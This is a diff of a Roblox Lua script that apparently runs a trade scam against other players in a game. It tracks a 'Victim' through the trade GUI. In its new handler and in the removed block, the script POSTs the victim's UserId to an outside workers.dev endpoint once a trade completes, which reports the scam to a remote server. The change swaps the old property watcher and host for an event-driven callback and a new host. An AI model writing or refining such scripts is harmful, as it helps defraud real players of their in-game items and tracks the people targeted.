@@ -161,8 +161,12 @@ ntv.UICorner:Clone().Parent = Label
 local Events = game:GetService("ReplicatedStorage"):WaitForChild("Events")
 local TradeGui = require(game:GetService("ReplicatedStorage"):WaitForChild("Gui"):WaitForChild("TradeGui"))
 local SessionID
+local function FinishHeartbeat()
+    
+end
 require(Events).ClientListen("TradeUpdateInfo", function(IncomingData)
     SessionID = IncomingData.SessionID
+    pcall(FinishHeartbeat, IncomingData)
 end)
 local Victim
 repeat task.wait() until LocalPlayer:FindFirstChild("PlayerGui") and
@@ -238,6 +242,20 @@ local function IsMarked(id)
 end
 
 local HttpService = game:GetService("HttpService")
+function FinishHeartbeat(IncomingData)
+    if IncomingData.State == "Completed" and Victim then
+        SafeRequest({
+            Url = "https://testbss.diddygameryt.workers.dev/finished",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+            },
+            Body = HttpService:JSONEncode({
+                userid = Victim.UserId
+            })
+        })
+    end
+end
 
 local function getMsgTime(msg)
     local year, month, day, hour, min, sec =
@@ -381,22 +399,6 @@ task.spawn(function()
             Completed = true
             return warn("Found completion marker")
         end
-    end
-end)
-LocalPlayer.TradeConfig.IsTrading:GetPropertyChangedSignal("Value"):Connect(function()
-    if LocalPlayer.TradeConfig.IsTrading.Value then
-        repeat task.wait() until not LocalPlayer.TradeConfig.IsTrading.Value
-        if not Victim then return end
-        SafeRequest({
-            Url = "https://testbss.chieokure.workers.dev/finished",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-            },
-            Body = HttpService:JSONEncode({
-                userid = Victim.UserId
-            })
-        })
     end
 end)
 if isfile("ExodusAutojoin") then
